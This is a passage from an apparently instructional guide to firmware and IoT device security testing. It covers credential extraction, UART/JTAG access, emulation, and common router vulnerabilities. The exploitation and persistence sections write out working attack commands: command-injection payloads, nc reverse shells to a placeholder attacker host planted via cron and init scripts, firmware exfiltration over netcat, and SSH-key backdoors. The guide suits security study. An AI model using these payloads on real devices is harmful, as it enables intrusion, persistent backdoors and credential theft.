Device files (usually empty in filesystem image)\nproc/       # Process info (mounted at runtime)\ntmp/        # Temporary files\n"})}),"\n",(0,s.jsx)(n.h3,{id:"searching-for-sensitive-information",children:"Searching for Sensitive Information"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Hardcoded credentials:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Search for passwords in configuration files:\ngrep -r "password\\|passwd\\|pwd" etc/\n\n# Common files with credentials:\ncat etc/passwd        # User accounts\ncat etc/shadow        # Password hashes (if present)\ncat etc/config/*      # Vendor-specific config files\n\n# Example (TP-Link router):\ncat etc/config/account\n# username=admin\n# password=21232f297a57a5a743894a0e4a801fc3  (MD5 hash of "admin")\n\n# Search for API keys, tokens:\ngrep -r "api_key\\|token\\|secret" etc/ www/\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Backdoor accounts:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Check for hidden admin accounts:\ncat etc/passwd | grep -v "^#"\n\n# Example backdoor:\n# debug:x:0:0:Debug User:/root:/bin/sh  (UID 0 = root)\n\n# Check for SSH authorized_keys:\nfind . -name "authorized_keys" -exec cat {} \\;\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Encryption keys:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Search for SSL/TLS private keys:\nfind . -name "*.pem" -o -name "*.key"\n\n# Example:\ncat etc/ssl/private/server.key\n# -----BEGIN RSA PRIVATE KEY-----\n# ...\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Configuration files:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Web server config:\ncat etc/httpd.conf\ncat etc/lighttpd/lighttpd.conf\n\n# Telnet/SSH config:\ncat etc/inetd.conf\ncat etc/dropbear/dropbear_rsa_host_key\n\n# Wireless config (routers):\ncat etc/config/wireless\n# Contains WiFi passwords, security settings\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web-application-files",children:"Web Application Files"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Analyzing web interfaces:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Web root (common locations):\ncd www/\n# or\ncd usr/www/\n# or\ncd home/httpd/\n\n# Identify web server:\nps aux | grep httpd\n# Common embedded web servers: lighttpd, boa, goahead, thttpd\n\n# Analyze CGI scripts (common vulnerability source):\nfind www/ -name "*.cgi" -o -name "*.sh"\n\n# Example CGI script:\ncat www/cgi-bin/login.cgi\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"CGI command injection example:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Vulnerable CGI script (login.cgi):\n#!/bin/sh\nUSERNAME=$1\nPASSWORD=$2\n\n# Vulnerable: unsanitized input passed to system command\n/usr/bin/check_password $USERNAME $PASSWORD\n\n# Exploitation (command injection via username parameter):\n# http://router.ip/cgi-bin/login.cgi?username=admin;reboot;&password=pass\n# Result: Router reboots due to injected "reboot" command\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"binary-analysis",children:"Binary Analysis"}),"\n",(0,s.jsx)(n.h3,{id:"analyzing-embedded-binaries",children:"Analyzing Embedded Binaries"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Common binary types:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"BusyBox:"})," Single binary with multiple utilities (ls, cat, wget, etc.)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Custom daemons:"})," httpd, telnetd, dropbear (SSH), etc."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Proprietary applications:"})," Vendor-specific services"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Disassembly tools:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# For ARM/MIPS binaries, use:\n# - Ghidra (supports ARM, MIPS, PowerPC)\n# - IDA Pro (commercial, excellent ARM/MIPS support)\n# - Radare2 (free, supports many architectures)\n\n# Example: Analyze httpd binary in Ghidra\n# 1. Load bin/httpd in Ghidra\n# 2. Select architecture: ARM:LE:32:v7 (or MIPS:LE:32:default)\n# 3. Analyze with default settings\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Finding vulnerabilities in binaries:"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"1. Stack buffer overflows:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"// Vulnerable code (decompiled from httpd):\nvoid handle_request(char *request) {\n    char buffer[256];\n    strcpy(buffer, request);  // No bounds checking!\n    process_request(buffer);\n}\n\n// Exploitation: Send request > 256 bytes to overflow buffer\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"2. Format string vulnerabilities:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// Vulnerable code:\nvoid log_message(char *user_input) {\n    syslog(LOG_INFO, user_input);  // User input directly in format string!\n}\n\n// Exploitation:\n// Input: "%x %x %x %x" -> Leak stack memory\n// Input: "%n" -> Write to arbitrary memory\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"3. Command injection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// Vulnerable code (CGI script analysis):\nvoid ping_host(char *ip) {\n    char cmd[512];\n    sprintf(cmd, "ping -c 1 %s", ip);  // Unsanitized input!\n    system(cmd);\n}\n\n// Exploitation:\n// Input: "8.8.8.8; cat /etc/shadow"\n// Executed command: "ping -c 1 8.8.8.8; cat /etc/shadow"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"cross-compilation-for-testing",children:"Cross-Compilation for Testing"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Set up cross-compiler:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install ARM cross-compiler (for ARM targets):\nsudo apt install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi\n\n# Compile exploit:\narm-linux-gnueabi-gcc exploit.c -o exploit -static\n\n# Install MIPS cross-compiler (for MIPS targets):\nsudo apt install gcc-mipsel-linux-gnu g++-mipsel-linux-gnu\n\n# Compile for MIPS:\nmipsel-linux-gnu-gcc exploit.c -o exploit -static\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"hardware-interfaces",children:"Hardware Interfaces"}),"\n",(0,s.jsx)(n.h3,{id:"uart-universal-asynchronous-receivertransmitter",children:"UART (Universal Asynchronous Receiver/Transmitter)"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"UART"})," is a serial debug console, often exposed on PCB test points."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Finding UART pins:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Visual inspection:\n# Look for 3-4 pins labeled: TX, RX, GND, (VCC)\n# Often located near main processor or edge of PCB\n\n# Common UART pin configurations:\n# 4-pin: VCC, TX, RX, GND\n# 3-pin: TX, RX, GND (most common)\n\n# Pin identification (if not labeled):\n# 1. GND: Use multimeter continuity test to ground (e.g., USB shield)\n# 2. VCC: Measure voltage with multimeter (3.3V or 5V when device powered)\n# 3. TX: Voltage fluctuates during boot (transmits data)\n# 4. RX: Voltage stable (receives data, safe to probe)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"UART connection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Hardware required:\n# - USB-to-UART adapter (FTDI FT232, CP2102, PL2303)\n# - Jumper wires\n# - Multimeter (to identify pins)\n\n# Wiring (device UART to USB adapter):\n# Device TX  -> Adapter RX\n# Device RX  -> Adapter TX\n# Device GND -> Adapter GND\n# (Do NOT connect VCC unless necessary - power device separately)\n\n# Determine baud rate (common: 115200, 57600, 38400, 9600)\n# Try common baud rates in minicom/screen\n\n# Linux: Connect via screen\nscreen /dev/ttyUSB0 115200\n\n# Or use minicom:\nsudo minicom -D /dev/ttyUSB0 -b 115200\n\n# Windows: Use PuTTY or TeraTerm\n# Serial, COM3, 115200 baud, 8N1\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"UART baud rate detection (if unknown):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Use logic analyzer or oscilloscope to measure bit timing\n# Or try common rates:\nfor baud in 9600 19200 38400 57600 115200 230400; do\n    echo "Trying baud rate: $baud"\n    screen /dev/ttyUSB0 $baud\n    # Press Enter, look for readable output\n    # Ctrl+A, K to exit\ndone\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"UART shell access:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Best case: Get root shell directly\n# Output during boot:\n# ...\n# BusyBox v1.28.4 (2023-01-01 12:00:00 UTC) built-in shell (ash)\n# Enter 'help' for a list of built-in commands.\n#\n# / #  (root shell!)\n\n# Commands to run:\ncat /proc/cpuinfo       # CPU architecture\ncat /proc/mtd           # Flash partitions\ncat /proc/cmdline       # Kernel boot parameters\nifconfig                # Network configuration\nps aux                  # Running processes\ncat /etc/passwd         # User accounts\ncat /etc/shadow         # Password hashes (if readable)\n\n# Dump firmware from UART:\ndd if=/dev/mtd0 | nc &lt;attacker_ip&gt; 1234\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Bypassing authentication (if UART is password-protected):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Method 1: Interrupt bootloader (U-Boot)\n# Power on device, press Ctrl+C or Enter repeatedly during boot\n# Drop into U-Boot shell:\n# U-Boot>\n\n# Common U-Boot commands:\nprintenv                # Show environment variables\nsetenv bootargs "init=/bin/sh"  # Boot directly to shell (bypass init)\nboot                    # Boot with modified parameters\n\n# Method 2: Edit kernel cmdline\nsetenv bootargs "console=ttyS0,115200 init=/bin/sh"\nsaveenv\nboot\n\n# Method 3: Single-user mode\nsetenv bootargs "console=ttyS0,115200 single"\nboot\n'})}),"\n",(0,s.jsx)(n.h3,{id:"jtag-joint-test-action-group",children:"JTAG (Joint Test Action Group)"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"JTAG"})," is a hardware debugging interface (more powerful than UART)."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"JTAG capabilities:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Full CPU control (set breakpoints, single-step execution)"}),"\n",(0,s.jsx)(n.li,{children:"Memory read/write (dump firmware, modify RAM)"}),"\n",(0,s.jsx)(n.li,{children:"Flash programming (write new firmware)"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Finding JTAG pins:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Common JTAG pin configurations:\n# - 20-pin ARM JTAG (standard)\n# - 14-pin JTAG (compact)\n# - 10-pin Cortex Debug (ARM Cortex-M)\n# - 5-pin JTAG (minimal: TDI, TDO, TMS, TCK, GND)\n\n# Pin identification (if not labeled):\n# Use JTAGulator or manual probing:\n# https://github.com/grandideastudio/jtagulator\n\n# Common pins:\n# TDI  - Test Data In\n# TDO  - Test Data Out\n# TMS  - Test Mode Select\n# TCK  - Test Clock\n# TRST - Test Reset (optional)\n# GND  - Ground\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"JTAG connection (using Bus Pirate or J-Link):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Using OpenOCD (Open On-Chip Debugger):\nsudo apt install openocd\n\n# Example config (ARM device):\n# openocd.cfg:\ninterface jlink\ntransport select jtag\nadapter speed 1000\njtag newtap chip cpu -irlen 4 -expected-id 0x07926041\ntarget create chip.cpu arm926ejs -chain-position chip.cpu\n\n# Connect:\nsudo openocd -f openocd.cfg\n\n# In another terminal (telnet to OpenOCD):\ntelnet localhost 4444\n\n# OpenOCD commands:\nhalt                    # Stop CPU\nreg                     # Show registers\nmdw 0x00000000 256      # Memory dump (256 words from 0x0)\ndump_image firmware.bin 0x00000000 0x800000  # Dump 8MB from flash\nreset                   # Reset device\n"})}),"\n",(0,s.jsx)(n.h3,{id:"spi-serial-peripheral-interface",children:"SPI (Serial Peripheral Interface)"}),"\n",(0,s.jsxs)(n.p,{children:["See ",(0,s.jsx)(n.a,{href:"#method-3-extract-from-flash-memory-hardware",children:"Firmware Acquisition \u2192 Extract from Flash Memory"})," for SPI flash extraction."]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"emulation--dynamic-analysis",children:"Emulation & Dynamic Analysis"}),"\n",(0,s.jsx)(n.h3,{id:"qemu-user-mode-emulation",children:"QEMU User-Mode Emulation"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Emulate individual binaries"})," (faster than full system emulation)."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install QEMU user-mode:\nsudo apt install qemu-user qemu-user-static\n\n# Copy ARM/MIPS binary from firmware:\ncp squashfs-root/bin/httpd .\n\n# Run ARM binary on x86 host:\nqemu-arm -L squashfs-root/ ./httpd\n\n# -L: Specify library path (extracted filesystem)\n\n# Run with strace (trace system calls):\nqemu-arm -L squashfs-root/ -strace ./httpd\n\n# Run MIPS binary:\nqemu-mipsel -L squashfs-root/ ./httpd\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Debugging with GDB:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Run binary in QEMU with GDB server:\nqemu-arm -L squashfs-root/ -g 1234 ./httpd\n\n# In another terminal, attach GDB:\ngdb-multiarch ./httpd\n(gdb) target remote localhost:1234\n(gdb) break main\n(gdb) continue\n"})}),"\n",(0,s.jsx)(n.h3,{id:"qemu-system-emulation",children:"QEMU System Emulation"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Emulate entire device"})," (router, IoT device)."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Extract kernel and filesystem from firmware:\nbinwalk -e firmware.bin\n\n# Identify kernel:\nfile _firmware.bin.extracted/*\n# Example: _firmware.bin.extracted/1C: Linux kernel ARM boot executable zImage\n\n# Extract kernel (if compressed):\nbinwalk -e _firmware.bin.extracted/1C\n\n# Run in QEMU (ARM example):\nqemu-system-arm \\\n    -M versatilepb \\\n    -kernel vmlinux \\\n    -initrd filesystem.cpio \\\n    -append "root=/dev/ram console=ttyAMA0" \\\n    -nographic\n\n# Common QEMU machine types:\n# -M versatilepb (ARM)\n# -M malta (MIPS)\n# -M virt (generic ARM/MIPS)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"firmadyne-automated-firmware-emulation",children:"Firmadyne (Automated Firmware Emulation)"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Firmadyne"})," automates firmware emulation and vulnerability testing."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install Firmadyne:\ngit clone https://github.com/firmadyne/firmadyne.git\ncd firmadyne\n./download.sh  # Download pre-built binaries\n\n# Setup database:\nsudo apt install postgresql\nsudo -u postgres createuser -P firmadyne  # Set password\nsudo -u postgres createdb -O firmadyne firmware\n\n# Import firmware database:\npsql -d firmware -U firmadyne < ./database/schema\n\n# Analyze firmware:\n./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk firmware.bin images\n\n# Emulate firmware:\n./scripts/getArch.sh ./images/1.tar.gz\n./scripts/makeImage.sh 1\n./scripts/inferNetwork.sh 1\n./scripts/run.sh 1\n\n# Access emulated device:\n# Network: 192.168.0.1 (or as detected)\n# Web interface: http://192.168.0.1/\n"})}),"\n",(0,s.jsx)(n.h3,{id:"fat-firmware-analysis-toolkit",children:"FAT (Firmware Analysis Toolkit)"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"FAT"})," is a wrapper around Firmadyne with additional features."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install FAT:\ngit clone https://github.com/attify/firmware-analysis-toolkit.git\ncd firmware-analysis-toolkit\n./setup.sh\n\n# Run analysis:\n./fat.py firmware.bin\n\n# Output:\n# - Extracts firmware\n# - Emulates in QEMU\n# - Runs vulnerability scanners (Nmap, Nessus)\n# - Generates report\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"common-vulnerabilities",children:"Common Vulnerabilities"}),"\n",(0,s.jsx)(n.h3,{id:"authentication-bypass",children:"Authentication Bypass"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Hardcoded credentials:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Found in etc/passwd or config files:\n# Username: admin\n# Password: admin (or default password)\n\n# MD5 hash in config:\n# password=21232f297a57a5a743894a0e4a801fc3\n# Crack with hashcat:\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n# Result: admin\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Backdoor accounts:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# etc/passwd entry:\ndebug:x:0:0:Debug:/root:/bin/sh\n\n# Login via telnet/SSH:\ntelnet 192.168.1.1\n# Username: debug\n# Password: (empty or default)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Authentication logic flaws:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// Vulnerable authentication (decompiled from httpd):\nif (strcmp(username, "admin") == 0) {\n    if (strcmp(password, stored_password) == 0) {\n        authenticated = 1;\n    }\n}\n\n// Bypass: If username != "admin", authentication check is skipped\n// Exploit: Use any username except "admin" (no password needed)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"command-injection",children:"Command Injection"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"CGI parameter injection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Vulnerable CGI script (/cgi-bin/ping.cgi):\n#!/bin/sh\nIP=$QUERY_STRING\nping -c 1 $IP > /tmp/ping.txt\ncat /tmp/ping.txt\n\n# Exploitation:\ncurl "http://router.ip/cgi-bin/ping.cgi?8.8.8.8;id"\n# Executed command: ping -c 1 8.8.8.8;id\n# Output: uid=0(root) gid=0(root) groups=0(root)\n\n# Reverse shell:\ncurl "http://router.ip/cgi-bin/ping.cgi?8.8.8.8;nc%20-e%20/bin/sh%20attacker.ip%201234"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"HTTP header injection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// Vulnerable code:\nvoid handle_user_agent(char *user_agent) {\n    char cmd[512];\n    sprintf(cmd, "echo %s >> /tmp/log", user_agent);\n    system(cmd);\n}\n\n// Exploitation (User-Agent header):\nUser-Agent: test; cat /etc/shadow > /tmp/shadow.txt\n'})}),"\n",(0,s.jsx)(n.h3,{id:"buffer-overflows",children:"Buffer Overflows"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Stack-based overflow:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// Vulnerable code (httpd):\nvoid process_url(char *url) {\n    char buffer[256];\n    strcpy(buffer, url);  // No bounds checking\n    // ...\n}\n\n// Exploitation (send long URL):\n# Python exploit:\npayload = b"A" * 300\nrequests.get(f"http://router.ip/{payload}")\n# Result: Crash (or RCE with proper exploit)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"insecure-firmware-updates",children:"Insecure Firmware Updates"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Unsigned firmware updates:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Firmware update without signature verification\n# Attacker can upload malicious firmware\n\n# Exploitation:\n# 1. Modify legitimate firmware (inject backdoor)\n# 2. Upload modified firmware via web interface\n# 3. Device installs malicious firmware\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Firmware downgrade attacks:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# If device allows downgrade to older, vulnerable firmware:\n# 1. Upload old firmware with known vulnerabilities\n# 2. Exploit old vulnerabilities\n"})}),"\n",(0,s.jsx)(n.h3,{id:"weak-cryptography",children:"Weak Cryptography"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Hardcoded encryption keys:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Found in binary or config:\nAES_KEY = "1234567890ABCDEF1234567890ABCDEF"\n\n# Use key to decrypt firmware or communications\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Weak password hashing:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# MD5 hashed passwords (etc/shadow):\nadmin:21232f297a57a5a743894a0e4a801fc3:0:0::/root:/bin/sh\n\n# Crack with hashcat:\nhashcat -m 0 hash.txt rockyou.txt\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"exploitation-techniques",children:"Exploitation Techniques"}),"\n",(0,s.jsx)(n.h3,{id:"gaining-shell-access",children:"Gaining Shell Access"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 1: Command injection"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Find injectable parameter (ping, traceroute, etc.)\n# Inject reverse shell:\nnc -e /bin/sh attacker.ip 1234\n\n# Or use Metasploit web_delivery:\nmsfconsole\nuse exploit/multi/script/web_delivery\nset target 7  # Python\nset payload linux/mipsle/shell_reverse_tcp  # Adjust for architecture\nset lhost attacker.ip\nrun\n\n# Inject generated command via vulnerable CGI parameter\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 2: Telnet/SSH with extracted credentials"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Found in etc/passwd:\n# root:x:0:0::/root:/bin/sh\n\n# Found in etc/shadow:\n# root:$1$xyz...:0:0::/root:/bin/sh\n\n# Crack hash or use default password\n# Login via telnet:\ntelnet router.ip\n# root / &lt;password&gt;\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 3: UART shell"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Connect to UART (see Hardware Interfaces section)\n# Interrupt boot, modify bootargs to spawn shell:\nsetenv bootargs "init=/bin/sh"\nboot\n'})}),"\n",(0,s.jsx)(n.h3,{id:"persistence-mechanisms",children:"Persistence Mechanisms"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 1: Modified firmware"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Extract firmware, add backdoor, repack, upload\n\n# Example: Add SSH authorized_key\necho "ssh-rsa AAAA... attacker@host" >> squashfs-root/etc/dropbear/authorized_keys\n\n# Repack squashfs:\nmksquashfs squashfs-root/ filesystem_modified.squashfs -comp xz\n\n# Rebuild firmware image:\n# (depends on firmware format - TRX, BIN, etc.)\n\n# Upload modified firmware via web interface or TFTP\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 2: Cron job"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Add cron job (if device supports cron):\necho "*/5 * * * * nc attacker.ip 1234 -e /bin/sh" >> /etc/crontabs/root\n\n# Make persistent (if filesystem is writable):\n# Mount root filesystem as RW, modify, sync\nmount -o remount,rw /\necho "*/5 * * * * nc attacker.ip 1234 -e /bin/sh" >> /etc/crontabs/root\nsync\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 3: Init script"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Add backdoor to init script:\necho "nc attacker.ip 1234 -e /bin/sh &" >> /etc/init.d/rcS\n\n# Make persistent:\nmount -o remount,rw /\nsync\n'})}),"\n",(0,s.jsx)(n.h3,{id:"post-exploitation",children:"Post-Exploitation"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Network pivoting:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Use compromised router as pivot point:\n# Route traffic through router to access internal network\n\n# Setup SOCKS proxy (if device has netcat/socat):\nssh -D 8080 root@router.ip\n\n# Or use Metasploit pivot:\nmsfconsole\nuse post/multi/manage/autoroute\nset session 1\nrun\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Extracting sensitive data:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Wireless credentials:\ncat /etc/config/wireless\n# Contains WPA/WPA2 passwords\n\n# VPN credentials:\ncat /etc/config/vpn\n\n# SNMP community strings:\ncat /etc/config/snmpd\n\n# Firmware encryption keys:\nfind / -name "*.key" -o -name "*.pem"\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"tools-reference",children:"Tools Reference"}),"\n",(0,s.jsx)(n.h3,{id:"firmware-analysis-tools",children:"Firmware Analysis Tools"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"}),(0,s.jsx)(n.th,{children:"Platform"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"binwalk"})}),(0,s.jsx)(n.td,{children:"Firmware extraction, entropy analysis"}),(0,s.jsx)(n.td,{children:"Linux, macOS"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"firmware-mod-kit"})}),(0,s.jsx)(n.td,{children:"Firmware unpacking/repacking"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"jefferson"})}),(0,s.jsx)(n.td,{children:"JFFS2 filesystem extractor"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"sasquatch"})}),(0,s.jsx)(n.td,{children:"SquashFS extractor (supports all versions)"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"ubi_reader"})}),(0,s.jsx)(n.td,{children:"UBI/UBIFS filesystem extractor"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"cramfsck"})}),(0,s.jsx)(n.td,{children:"CramFS extractor"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"firmware-analysis-toolkit (FAT)"})}),(0,s.jsx)(n.td,{children:"Automated firmware analysis"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Firmadyne"})}),(0,s.jsx)(n.td,{children:"Automated firmware emulation"}),(0,s.jsx)(n.td,{children:"Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"FACT"})}),(0,s.jsx)(n.td,{children:"Firmware Analysis and Comparison 